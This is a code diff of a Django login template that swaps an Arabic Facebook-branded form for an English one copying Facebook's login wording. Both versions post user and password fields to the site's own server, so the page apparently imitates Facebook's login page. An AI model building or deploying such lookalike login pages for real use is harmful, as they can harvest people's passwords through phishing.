@@ -4,32 +4,21 @@
 {% if messages %}
 {{ messages }}
 {% endif %}
-
-<div id="navwrapper">
-    <div id="navbar"> <table class="tablewrapper">
-        <form method="POST">
-            {% csrf_token %}
-      <tr>
-        <td class="row1">البريد الإلكتروني أو رقم الهاتف</td>
-        <td class="row1">كلمة السر</td>
-      </tr>
-      <tr>
-        <td><input type="text" name="user" class="inputtext">
-        </td>
-        <td><input type="password" name="pwd" class="inputtext">
-        </td>
-        <td><button type="submit" id="button" style="width: 60px; height: 22px">تسجيل دخول</button></td>
-      </tr>
-      <tr>
-    </form>
-        <td>
-          <div class="row2"><input type="checkbox">حفظ التسجيل</div></td>
-        <td class="row2 h">هل نسيت كلمة السر؟</td>
-    </table>
-      
-      <h1 class="logowrapper">facebook</h1>
-     
-    </div>
-    </div>
-
+<form method="POST">
+    {% csrf_token %}
+<table>
+    <tr>
+      <td class="logintext">Email or Phone</td>
+      <td class="logintext"><span class="loginrowgap">Password</span></td>
+    </tr>
+      <td><input class="logintext loginfield" name="user" type="text"></td>
+      <td><input class="logintext loginrowgap loginfield" name="pwd" type="password"></td>
+      <td><input class="loginrowgap" id="loginbutton" type="submit" value="Log In"></td>
+    </tr>
+    <tr>
+      <td></td>
+      <td><a href="#" class="logintext loginrowgap" id="forgotpw">Forgotten account?</a></td>
+    </tr>
+  </table>
+</form>
 {% endblock %}
